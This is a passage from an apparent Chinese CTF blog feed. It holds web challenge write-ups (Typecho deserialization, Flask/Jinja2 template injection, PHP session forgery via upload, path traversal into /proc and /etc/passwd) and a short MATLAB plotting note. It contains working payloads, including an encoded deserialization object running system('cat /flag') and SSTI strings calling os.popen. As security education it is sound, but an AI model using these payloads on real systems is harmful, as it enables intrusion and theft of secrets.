__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho//4.png"></p><p><strong><code>flag:  flag&#123;78b38374-212a-4f5b-9c5e-04bb9dc0d801&#125;</code></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> typecho反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019-I_&lt;3_Flask</title>
      <link href="/2020/10/30/RootersCTF2019-I-3-Flask/"/>
      <url>/2020/10/30/RootersCTF2019-I-3-Flask/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原来现在你不珍惜的，将来真的会有人替你去珍惜。</p></blockquote><h3 id="1-arjun工具"><a href="#1-arjun工具" class="headerlink" title="1.arjun工具"></a>1.arjun工具</h3><p>这是个解析<code>http参数</code>的工具。</p><blockquote><p>用户可以使用下列命令查找GET参数：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 arjun.py -u http://c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn/ --get</span><br></pre></td></tr></table></figure><blockquote><p>类似的，用户可以使用–post来查找POST请求。</p></blockquote><p><a href="https://www.freebuf.com/sectool/200175.html">使用方法</a></p><p>一般情况下就用上面的命令就可了。</p><p>这个因为环境反应速度太慢了，没搞出来，有点小小的遗憾吧。</p><p>但是看wp得知这个有个get的参数<code>name</code>。</p><h2 id="2-模版注入"><a href="#2-模版注入" class="headerlink" title="2.模版注入"></a>2.模版注入</h2><p>根据提示<code>flask</code>想到是模版注入，传参<code>/?name=&#123;&#123;7*7&#125;&#125;</code>，返回的内容为<code>I ♥ Flask &amp; 49</code>可判断确实是模版注入，那用得是哪个模板呢？</p><p>~</p><h2 id="3-tplmap工具"><a href="#3-tplmap工具" class="headerlink" title="3.tplmap工具"></a>3.tplmap工具</h2><p><a href="https://github.com/epinna/tplmap">这个工具</a>是个判断用的是哪个框架的工具，具体的使用方法就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./tplmap.py -u &#x27;http://www.target.com/page?name=John&#x27;</span><br></pre></td></tr></table></figure><p>就是想上面那样用，然后对于我们这道题，利用的语句就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u http://c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn/?name= --os-shell</span><br></pre></td></tr></table></figure><p>~</p><p>下面是<code>jinja2模版注入的常用payload</code>，网上别人总结的一大堆，有空可总结一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>直接获得flag。</p><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h2><p><img src="/2020/10/30/RootersCTF2019-I-3-Flask//1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I ♥ Flask &amp; flag&#123;211cf5b3-8647-44a5-90d5-b0a489262a4e&#125;</span><br></pre></td></tr></table></figure><blockquote><p>人生如白驹过隙，忽然而已。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> arjun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-BabyUpload</title>
      <link href="/2020/10/30/HFCTF2020-BabyUpload/"/>
      <url>/2020/10/30/HFCTF2020-BabyUpload/</url>
      
        <content type="html"><![CDATA[<blockquote><p>不是我不明白，这世界变化太快。</p></blockquote><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><p>下面是源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&quot;/var/babyctf/&quot;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &quot;/flag&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">/*下面是得flag的地方*/</span><br><span class="line">if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);</span><br><span class="line">$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);</span><br><span class="line">$dir_path = &quot;/var/babyctf/&quot;.$attr;</span><br><span class="line">if($attr===&quot;private&quot;)&#123;</span><br><span class="line">    $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($direction === &quot;upload&quot;)&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid upload&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, 0700, TRUE);</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123;</span><br><span class="line">            $upload_result = &quot;uploaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; elseif ($direction === &quot;download&quot;) &#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$filename;</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!file_exists($file_path)) &#123;</span><br><span class="line">            throw new RuntimeException(&#x27;file not exist&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        header(&#x27;Content-Type: application/force-download&#x27;);</span><br><span class="line">        header(&#x27;Content-Length: &#x27;.filesize($file_path));</span><br><span class="line">        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);</span><br><span class="line">        if(readfile($file_path))&#123;</span><br><span class="line">            $download_result = &quot;downloaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($_SESSION[&#x27;username&#x27;] === &#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>上面的要求就是<code>username</code>的值为<code>admin</code>，并且<code>filename</code>的值为<code>/var/babyctf/success.txt</code>就能die出flag啦</strong></p><h2 id="2-upload"><a href="#2-upload" class="headerlink" title="2.upload"></a>2.upload</h2><p>首先得想办法改session，那就得想办法查看session的编码，查看session编码的payload：<code>POST</code>:<code>direction=download&amp;attr=.&amp;filename=sess_+phpsessid</code><br><img src="/2020/10/30/HFCTF2020-BabyUpload//1.png"></p><p>看wp对session的存储方式不同</p><blockquote><p>php_binary:存储方式是，<code>键名的长度对应的ASCII字符</code>+<code>键名</code>+<code>经过serialize()函数序列化处理</code>的值<br>php:存储方式是，<code>键名</code>+<code>竖线</code>+<code>经过serialize()函数序列处理</code>的值<br>php_serialize(php&gt;5.5.4):存储方式是，<code>经过serialize()函数序列化处理</code>的值</p></blockquote><p>然后这里看到有个不可见字符，那对应的就是第一种情况了，而且可以说明这个<code>键名长度对应的ASCII字符</code>不可见。</p><p>在本地伪造session文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br><span class="line">session_save_path(&quot;F://&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p><strong>文件生成成功</strong><br><img src="/2020/10/30/HFCTF2020-BabyUpload//2.png"></p><p>然后将文件改名为sess，并进行<code>sha256</code>编码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hash_file(&#x27;sha256&#x27;, &#x27;F://sess&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>获得<br>session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></pre></td></tr></table></figure><p><strong>伪造文件成功</strong></p><p>现在就要把sess文件上传上去了，用下面的页面（跟着大师傅，总能学点新颖的操作）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;up_file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;.&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/10/30/HFCTF2020-BabyUpload//3.png"></p><p>然后上传我们伪造的文件就ok了。<br><img src="/2020/10/30/HFCTF2020-BabyUpload//4.png"></p><p><strong>创建success.txt文件成功</strong></p><p>文件内容改为以下，就改了个<code>.</code>为<code>success.txt</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;up_file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;success.txt&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在上传一次<code>sess</code>文件就可了。</p><p><strong>获得flag</strong></p><p>然后回到刚才的界面内，改下<code>phpsessid</code>为<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>，改<code>attr</code>对应的值为<code>success.txt</code>获得flag<br><img src="/2020/10/30/HFCTF2020-BabyUpload//6.png"><br><img src="/2020/10/30/HFCTF2020-BabyUpload//5.png"></p><p>flag为<code>flag&#123;f1dd4295-4d54-4f6d-a5ad-37f07f79c74b&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab学习之二</title>
      <link href="/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/"/>
      <url>/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>运算符部分先跳过，ye就是懒懒懒狗</p></blockquote><h2 id="1-matlab绘图"><a href="#1-matlab绘图" class="headerlink" title="1.matlab绘图"></a>1.matlab绘图</h2><p>先定义<code>x</code>得范围，然后定义<code>y=f(x)</code>，然后执行<code>plot(x, y)</code>，就能画出曲线了，下面是测试的代码与测试结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = [0:5:100];    %这里表示x的范围为从0到100，增量为5</span><br><span class="line">y = x;</span><br><span class="line">plot(x, y)</span><br></pre></td></tr></table></figure><p>上面的图形是条直线。<br><img src="/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C//1.png"></p><p><strong>y&#x3D;x^2的图像脚本如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = [-100:10:100];</span><br><span class="line">y = x.^2;</span><br><span class="line">plot(x, y);</span><br></pre></td></tr></table></figure><p><strong>sin(x)</strong></p><blockquote><p>xlabel和ylabel命令沿x轴和y轴生成标签。<br>title命令用于在图表上设置标题。<br>grid on命令用于将网格线放在图形上。<br>axis equal命令允许生成具有相同比例因子的绘图和两个轴上的空格。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [0:0.01:10];</span><br><span class="line">y = sin(x);</span><br><span class="line">plot(x, y), xlabel(&#x27;x&#x27;), ylabel(&#x27;Sin(x)&#x27;), title(&#x27;Sin(x) Graph&#x27;),</span><br><span class="line">grid on, axis equal</span><br></pre></td></tr></table></figure><p>生成的图像如下<br><img src="/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C//2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-2020-白虎组-PicDown</title>
      <link href="/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
      <url>/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</url>
      
        <content type="html"><![CDATA[<h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h2><p>首先，没有给出任何提示，只有一个输入框，回车后query里面多了个<code>?url=</code>，这就没啥技巧了吧，全靠猜测是不是有目录遍历漏洞。<br>遍历试试。payload:<code>../../../../etc/passwd</code>，然后返回一个下载的东西(是个jpg文件)，以记事本打开后就能看到文本内容了，的确是我们的目标——<code>passwd文件</code>。<br><strong>这里有个非预期解，就是直接<code>../../../../flag</code>，这样也能搞到flag，但是我们的本意不是这样，下面是预期解</strong></p><h2 id="2-下载主要文件"><a href="#2-下载主要文件" class="headerlink" title="2.下载主要文件"></a>2.下载主要文件</h2><p>首先通过linux进程管理看下<code>../../../../../proc/self/cmdline</code>，可以读取当前进程文件。<img src="/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown//1.png"><br>是执行的<code>app.py文件</code>。</p><p>读一下该文件，payload为<code>?url=app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)                <span class="comment">#好家伙，这里直接把secret文件给删掉了。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br></pre></td></tr></table></figure><p>看这里，想getshell必须拿到secret_key，就是要拿到secret.txt文件的内容。</p><h2 id="2-linux进程管理之打开的每个进程的链接"><a href="#2-linux进程管理之打开的每个进程的链接" class="headerlink" title="2.linux进程管理之打开的每个进程的链接"></a>2.linux进程管理之打开的每个进程的链接</h2><p>怎么拿到刚才的secret.txt文件的内容呢？这里要用到linux的进程管理这个知识点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/proc/pid/cmdline  包含了用于开始进程的命令  ；</span><br><span class="line">/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；</span><br><span class="line">/proc/pid/environ  包含了可用进程环境变量的列表  ；</span><br><span class="line">/proc/pid/exe  包含了正在进程中运行的程序链接；</span><br><span class="line">/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；</span><br><span class="line">/proc/pid/mem  包含了进程在内存中的内容；</span><br><span class="line">/proc/pid/stat 包含了进程的状态信息；</span><br><span class="line">/proc/pid/statm  包含了进程的内存使用信息。</span><br></pre></td></tr></table></figure><p>这里用得到的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；</span><br></pre></td></tr></table></figure><p>读一下，用下面的paylaod:<code>/page?url=../../../../proc/self/fd/3</code>，这里的<code>/proc/self</code>也是一个链接文件，当进程访问此链接时，就会访问这个进程本身的<code>/proc/pid目录</code></p><p>然后获得secret内容为<code>zgySafkqtdMW5uvibbmE/DEe+aS1hhNbqRa+rqSaavY=</code></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=zgySafkqtdMW5uvibbmE/DEe+aS1hhNbqRa+rqSaavY=</span><br></pre></td></tr></table></figure><blockquote><p>到这了，不知道为啥<code>key</code>总是错误，不测了（测一个小时了），心态崩了。。。</p></blockquote><p><img 